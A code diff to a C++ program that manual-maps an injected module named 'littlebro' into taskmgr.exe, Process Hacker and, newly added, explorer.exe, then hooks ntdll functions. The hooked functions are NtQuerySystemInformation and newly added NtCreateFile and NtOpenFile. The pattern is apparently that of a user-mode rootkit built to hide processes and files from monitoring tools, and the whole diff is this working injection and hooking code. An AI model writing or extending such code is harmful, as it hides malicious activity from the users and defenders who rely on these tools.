@@ -19,10 +19,12 @@ int main()
 		{ "ntdll.dll", "NtTerminateProcess", "ntterm" },
 		{ "ntdll.dll", "NtSuspendProcess", "ntsusp" },
 		{ "ntdll.dll", "NtOpenProcess", "ntop" },
-		{ "ntdll.dll", "NtQuerySystemInformation", "qsi" }
+		{ "ntdll.dll", "NtQuerySystemInformation", "qsi" },
+		{ "ntdll.dll", "NtCreateFile", "ntcr"},
+		{ "ntdll.dll", "NtOpenFile", "ntopf"}
 	};
 
-	for (const auto& process_name : { "taskmgr.exe", "ProcessHacker.exe" })
+	for (const auto& process_name : { "taskmgr.exe", "processhacker.exe", "explorer.exe" })
 	{
 		auto process_list = process::get_all_from_name(process_name);
 
@@ -36,6 +38,13 @@ int main()
 
 			// MAP LITTLEBRO INTO TARGET PROCESS
 			auto proc = process(id, PROCESS_ALL_ACCESS);
+
+			if (!proc)
+			{
+				logger::log_error("Non-sufficient elevation, aborting");
+				continue;
+			}
+
 			auto littlebro = injection::manualmap(proc).inject(littlebro_buffer);
 
 			// HOOK FUNCTIONS
@@ -49,6 +58,7 @@ int main()
 		}
 	}
 
+	logger::log("Finished!");
 	std::cin.get();
     return 0;
 }
